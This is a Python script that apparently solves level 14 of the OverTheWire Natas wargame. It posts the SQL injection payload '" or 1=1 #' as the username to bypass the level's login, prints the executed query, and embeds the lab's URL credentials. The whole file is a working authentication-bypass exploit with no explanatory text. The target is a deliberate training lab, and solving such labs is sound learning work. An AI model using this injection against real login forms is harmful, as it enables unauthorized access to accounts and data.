import requests

url = "http://natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1@natas14.natas.labs.overthewire.org/index.php?debug=true"

user="\" or 1=1 #\""
passw=""
r = requests.post(url, data={'username':user, 'password': passw})

splitted = r.text.split('Executing query: ')[1].split('<br>')
query_executed = splitted[0]
warning_or_error = splitted[1]

print(f"SQL Query : {query_executed}")

if 'Access denied' not in warning_or_error:
	print("Got access !")
	print(warning_or_error)
else:
	print(warning_or_error.replace('<b>', '').replace('</b>', '').replace('<br />', ''))
